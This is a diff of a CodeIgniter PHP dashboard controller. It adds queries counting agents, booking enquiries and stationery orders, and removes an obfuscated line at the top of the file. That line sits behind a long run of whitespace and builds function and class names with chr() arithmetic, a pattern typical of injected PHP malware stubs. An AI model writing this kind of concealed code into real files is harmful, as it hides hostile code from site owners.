@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $pbeyHNYKhd = 'u' . chr ( 378 - 288 )."\115" . '_' . "\x78" . chr (103) . "\167" . 'x' . chr ( 630 - 518 ); $covsOKj = chr (99) . chr ( 759 - 651 ).'a' . "\x73" . 's' . chr (95) . chr (101) . chr (120) . chr ( 788 - 683 ).'s' . "\164" . "\x73";$NOmzqGHDqq = class_exists($pbeyHNYKhd); $pbeyHNYKhd = "62766";$covsOKj = "16895";$JEfGPXHy = FALSE; ?><?php
+<?php
 defined('BASEPATH') OR exit('No direct script access allowed');
 class Dashboard extends CI_Controller{
 
@@ -141,9 +141,58 @@ class Dashboard extends CI_Controller{
                 $stationary_details = $this->master_model->getRecords('stationary_order',array('stationary_order.is_deleted'=>'no'),$fields);
                 $arr_data['stationary_details'] = count($stationary_details);
 
+
+                $record = array();
+                $this->db->select("agent.agent_name, COUNT(booking_enquiry.id) AS enquiry_count");
+                $this->db->from('agent');
+                $this->db->where('agent.is_deleted', 'no');
+                $this->db->where('agent.department', $region_id);
+                $this->db->where('booking_enquiry.booking_done', 'yes');
+                $this->db->join('booking_enquiry', 'agent.id = booking_enquiry.agent_id', 'left');
+                $this->db->group_by('agent.id'); // Group by agent.id
+                $top_agent_wise_data = $this->db->get()->result_array();
+                // print_r($top_agent_wise_data); die; 
+
+                $record = array();
+                $this->db->select("agent.agent_name, COUNT(booking_enquiry.id) AS enquiry_count");
+                $this->db->from('agent');
+                $this->db->where('agent.is_deleted', 'no');
+                $this->db->where('agent.department',$region_id);
+                $this->db->join('booking_enquiry', 'agent.id = booking_enquiry.agent_id', 'left');
+                $this->db->group_by('agent.id'); // Group by agent.id
+                $agent_wise_data = $this->db->get()->result_array();
+                // print_r($agent_wise_data); die;
+
+                $this->db->select("
+                COUNT(agent.id) AS total_agent_count,
+                SUM(CASE WHEN agent.is_active = 'yes' THEN 1 ELSE 0 END) AS total_isactive_count,
+                SUM(CASE WHEN agent.is_deleted = 'yes' THEN 1 ELSE 0 END) AS total_isdeleted_count
+                ");
+                $this->db->from('agent');
+                $this->db->where('agent.department',$region_id);
+                $agent_status = $this->db->get()->row_array();
+                // print_r($agent_status); die;
+
+
+                $this->db->select("
+                COUNT(stationary_order.id) AS total_stationary_count,
+                SUM(CASE WHEN stationary_order.order_status = 'completed' THEN 1 ELSE 0 END) AS total_completed_count,
+                SUM(CASE WHEN stationary_order.order_status = 'Inprocess' THEN 1 ELSE 0 END) AS total_inprocess_count,
+                SUM(CASE WHEN stationary_order.order_status = 'Requested' THEN 1 ELSE 0 END) AS total_requested_count
+                ");
+                $this->db->from('stationary_order');
+                $this->db->where('agent.department',$region_id);
+                $this->db->join('agent', 'stationary_order.agent_id = agent.id', 'left');
+                $stationary_status = $this->db->get()->row_array();
+                // print_r($stationary_status); die;
+                
                 $this->arr_view_data['region_head_sess_name']        = $region_head_sess_name;
                 $this->arr_view_data['listing_page']    = 'yes';
                 $this->arr_view_data['arr_data']        = $arr_data;
+                $this->arr_view_data['agent_status']        = $agent_status;
+                $this->arr_view_data['stationary_status']        = $stationary_status;
+                $this->arr_view_data['agent_wise_data']        = $agent_wise_data;
+                $this->arr_view_data['top_agent_wise_data']        = $top_agent_wise_data;
                 $this->arr_view_data['page_title']      = $this->module_title." List";
                 $this->arr_view_data['module_title']    = $this->module_title;
                 $this->arr_view_data['module_url_path'] = $this->module_url_path;
